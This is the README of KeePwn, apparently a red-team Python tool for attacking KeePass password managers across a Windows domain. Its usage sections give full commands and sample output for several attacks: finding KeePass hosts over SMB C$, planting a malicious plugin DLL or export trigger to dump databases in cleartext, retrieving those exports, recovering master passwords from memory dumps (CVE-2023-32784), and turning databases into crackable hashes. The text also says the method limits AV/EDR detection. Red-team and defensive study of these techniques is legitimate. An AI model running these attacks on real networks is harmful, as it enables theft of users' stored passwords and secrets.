![](./.github/images/keepwn_banner.png)

<p align="center">
  A python script to help red teamers discover KeePass instances and extract secrets.
</p>


## Features

- [x] KeePass Discovery
  - [x] Look for KeePass installation files through SMB C$ share.
  - [x] Accept multiple target sources (IP, CIDR, hostname, file).
  - [x] Check for KeePass metadata (version, last access time).
  - [x] Check for running KeePass process through Impacket-based RPC.
  - [x] Multi-threaded implementation to avoid bottleneck hosts.
  - [x] Export search results to CSV.
  - [ ] Find KDBX databases.
- [x] KeePass Plugin Abuse
  - [x] Add and remove KeePass plugins (see [KeeFarce Reborn](https://github.com/d3lb3/KeeFarceReborn)) through SMB C$ share.
  - [x] Retrieve cleartext exports on the remote host.
- [x] KeePass Trigger Abuse
  - [x] Add and remove triggers (see: [KeeThief](https://blog.harmj0y.net/redteaming/keethief-a-case-study-in-attacking-keepass-part-2) from KeePass configuration file through SMB C$ share.
  - [x] Retrieve cleartext exports on the remote host.
  - [ ] Customize triggers with command line arguments.
- [x] KeePass Dump Parsing
  - [x] Parse memory dumps to find master password candidates (CVE-2023-32784).
  - [ ] Parse memory dumps to find encryption key.
- [x] KeePass Database Cracking
  - [x] Convert KDBX to John and Hashcat compatible formats.
  - [ ] Add support for [KDBX 4.x format](https://palant.info/2023/03/29/documenting-keepass-kdbx4-file-format).
- [x] Authentication
  - [x] Support LM/NT hash authentication.
  - [ ] Support Kerberos Authentication.
- [ ] Miscellaneous
  - [ ] Write unit tests.
  - [ ] Make the project available on [PyPI](https://pypi.org/) .

## Installation

```
git clone https://github.com/Orange-Cyberdefense/KeePwn && cd KeePwn
python3 -m pip install .
KeePwn --help
```

Or if you don't want to install but just run in a virtualenv:

```
git clone https://github.com/Orange-Cyberdefense/KeePwn && cd KeePwn
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install -r requirements.txt
python3 KeePwn.py --help
```

## Usage

<details><summary><b>Discovery</b></summary>

KeePwn's `search` module is used to identify hosts that run KeePass on your target environment:

```
$ python3 KeePwn.py search -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -tf ./targets.txt

[*] Starting remote KeePass search with 5 threads

[PC01.COMPANY.LOCAL] No KeePass-related file found
[PC02.COMPANY.LOCAL] No KeePass-related file found
[PC03.COMPANY.LOCAL] Found '\\C$\Program Files\KeePass Password Safe 2\KeePass.exe' (Version: 2.57.1, LastUpdateCheck: 48 minutes ago)
[PC03.COMPANY.LOCAL] Found '\\C$\Users\jdoe\AppData\Roaming\KeePass\KeePass.config.xml'
[PC04.COMPANY.LOCAL] No KeePass-related file found
[PC05.COMPANY.LOCAL] No KeePass-related file found
```

It makes use of Active Directory built-in C$ share to look for KeePass-related files in default locations, hence requiring administrator privileges on the targets.

The module will first look for *KeePass.config.xml* configuration file in each user's *%APPDATA%\KeePass folder*, as well as *KeePass.exe* in its default installation path (*C:\Program Files\KeePass Password Safe 2*). If a configuration file is found but KeePass is not installed globally, KeePwn will look for portable installations up to `--max-depth` subfolders.

This basic search technique should be enough to accurately determine if KeePass is used on a workstation or not. In addition, the `--get-process` option will use Impacket's RPC implementation to determine if KeePass is currently running on the target.

Various quality of life options are also included to let you export search results to a CSV file, display only targets where KeePass is found and adjust the number of parallel threads:

```
$ KeePwn search -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -tf ./targets.txt --threads 4 --get-process --found-only --output keepwn_out.csv

[*] Starting remote KeePass search with 4 threads

[PC03.COMPANY.LOCAL] Found '\\C$\Program Files\KeePass Password Safe 2\KeePass.exe' (Version: 2.57.1, LastUpdateCheck: 48 minutes ago)
[PC03.COMPANY.LOCAL] Found '\\C$\Users\jdoe\AppData\Roaming\KeePass\KeePass.config.xml'
[PC03.COMPANY.LOCAL] Found running KeePass.exe process (User: COMPANY\jdoe, PID: 3820)

[+] Search results logged to keepwn_out.csv
```

</details>
<details><summary><b>Plugin Abuse</b></summary>

KeePass features a [plugin framework](https://keepass.info/help/v2/plugins.html) which can be abused to load malicious DLLs into KeePass process, allowing attackers with administrator rights to easily export the database (see: [KeeFarceRebornPlugin](https://github.com/d3lb3/KeeFarceReborn#make-keepass-inject-keefarce-reborn-as-a-plugin)).

KeePwn's `plugin` module allows to :

- List currently installed plugins and enumerate the plugin cache

  ```
  $ KeePwn plugin check -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL                                   
  
  [*] No path specified, searching in default locations..
  [*] Found dbBackup.plgx in folder '\\C$\Program Files\KeePass Password Safe 2\Plugins\'
  [*] Found pDhkzWQYiobXhtBEEnbo in folder '\\C$\Users\jdoe\AppData\Local\KeePass\PluginCache'
  ```

- Add and remove your malicious plugins

  ```
  $ KeePwn plugin add -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL --plugin KeeFarceRebornPlugin.dll  

  [*] No path specified, searching in default locations..
  [*] Found KeePass Plugins directory '\\C$\Program Files\KeePass Password Safe 2\Plugins\'
  [!] About to add KeeFarceRebornPlugin.dll to KeePass Plugins directory, do you want to continue? [y/n]
  > y
  [+] Plugin successfully added to KeePass, wait for next restart, poll and enjoy!
  ```

- Poll %APPDATA% for exports and automatically moves it from remote host to local filesystem

  ```
  $ KeePwn plugin poll -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL                                  

  [*] Polling for database export every 5 seconds.. press CTRL+C to abort. DONE                                                                                                                                                                                
  [+] Found cleartext export '\\C$\\Users\jdoe\AppData\Roaming\export.xml'
  [+] Moved remote export to ./export.xml
  ```

These actions are made through SMB C$ share access, limiting AV/EDR detection as no command execution is performed.

</details>
<details><summary><b>Trigger Abuse</b></summary>

As described in [@harmj0y's blog post](https://blog.harmj0y.net/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/) (and later CVE-2023-24055), KeePass trigger system can be abused in order to export the database in cleartext.

KeePwn's `trigger` module allows to :

- Check if a malicious trigger named "export" is currently written in KeePass configuration

  ```
  $ KeePwn trigger check -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL       

  [*] No KeePass configuration path specified, searching in default locations..
  [*] Found global KeePass configuration '\\C$\Program Files\KeePass Password Safe 2\KeePass.config.xml'
  [*] PreferUserConfiguration flag is set to true, meaning that local configuration is used
  [*] Found local KeePass configuration '\\C$\Users\jdoe\AppData\Roaming\KeePass\KeePass.config.xml'
  [+] No trigger found in KeePass configuration
  ```
  
  Note that KeePwn will prevent you to abuse plugins if the detected KeePass version is not affected by this technique.

- Add and remove a malicious trigger named "export" which performs a cleartext export of the database in %APPDATA% on next KeePass launch

  ```
  ❯ python3 KeePwn.py trigger add -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL       

  [*] No KeePass configuration path specified, searching in default locations..
  [*] Found global KeePass configuration '\\C$\Program Files\KeePass Password Safe 2\KeePass.config.xml'
  [*] PreferUserConfiguration flag is set to true, meaning that local configuration is used
  [*] Found local KeePass configuration '\\C$\Users\jdoe\AppData\Roaming\KeePass\KeePass.config.xml'
  [+] Malicious trigger 'export' successfully added to KeePass configuration file (it may be deleted if KeePass is already running)
  ```

- Poll %APPDATA% for exports and automatically moves it from remote host to local filesystem

  ```
  $ KeePwn trigger poll -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL                                  

  [*] Polling for database export every 5 seconds.. press CTRL+C to abort. DONE                                                                                                                                                                                
  [+] Found cleartext export '\\C$\\Users\jdoe\AppData\Roaming\export.xml'
  [+] Moved remote export to ./export.xml
  ```

If the configuration file path is not the default location, you can specify one with `--config-path` argument.

</details>
<details><summary><b>Memory Dumps Parsing</b></summary>

As described by [@vdohney](https://github.com/vdohney/keepass-password-dumper), it is possible to retrieve the database's master password in memory (CVE-2023-32784, affecting versions prior to KeePass 2.54). 

KeePwn `parse_dump` module will search for potential master password candidates in dumps. Because the resulting strings will (by design) be incomplete, the module can also be used to bruteforce the missing first character against a specified KDBX file.

```
$ python3 KeePwn.py parse_dump -d ./KeePass.DMP --bruteforce Database.kdbx

[*] Searching for the master password in memory dump.. done!                                                                                                                                                                                                 
[*] Found 15 candidates:
     ＿@$$w0rd!!
     ＿Ï$$w0rd!!
     ＿§$$w0rd!!
     ＿ñ$$w0rd!!
     ＿D$$w0rd!!
     ＿$$w0rd!!
     ＿\$$w0rd!!
     ＿#$$w0rd!!
     ＿y$$w0rd!!
     ＿k$$w0rd!!
     ＿9$$w0rd!!
     ＿;$$w0rd!!
     ＿H$$w0rd!!
     ＿>$$w0rd!!
     ＿a$$w0rd!!

[*] Bruteforcing missing symbol with the 254 most common unicode characters.. done!                                                                                                                                                                          
[+] Database.kdbx successfully unlocked using master password P@$$w0rd!!
```

The memory dump parsing makes use of [@CMEPW's Python PoC](https://github.com/CMEPW/keepass-dump-masterkey). Thanks for letting me re-use the code :)

</details>
<details><summary><b>Cracking KDBX Databases</b></summary>

keepass2john.py script by [@harmjoy](https://github.com/HarmJ0y) was ported to KeePwn with the help of [@0xSp3ctra](https://github.com/0xSp3ctra).

KeePwn `convert` will extract a crackable hash (john or hashcat format) from a KeePass Database. 

```
KeePwn convert -d ./Database.kdbx 

[+] Happy cracking! (hashcat -m 13400)
$keepass$*2*60000*222*b794eae002aff2a55a307bedeadebee210ee3c3596731f5acf2a1ff3add7d5af*7f19293f120717cbb88cdd27a3d4b9cb58316c61c625ca3a39f94c5a96b6135b*c004b3bc403730ce1bba15d5feda18e2*55a142d52798313c336c9442d824d7098ded3c5e161b76640100c99ec1cd95e1*60bb1f64c2bfff8a4e1eb43c533054f2f5c46fac19a867e7f80a1a71d6b68f17
```

It can be used with more arguments to specify the expected hash type as well as an output file path:

```
KeePwn convert -d ./Database.kdbx -t john -o ./Database.hash 

[+] Hash written to ./Database.hash, happy cracking! (john --format=keepass)
```

KDBX 4.x is not yet supported, you may use https://github.com/r3nt0n/keepass4brute. 
If you are in the mood for a PR https://palant.info/2023/03/29/documenting-keepass-kdbx4-file-format should be a good read :)

## Contribute

Pull requests are welcome (see: unchecked Features + some TODOs in code).

Feel free to open an issue or DM me on Twitter to suggest improvement.
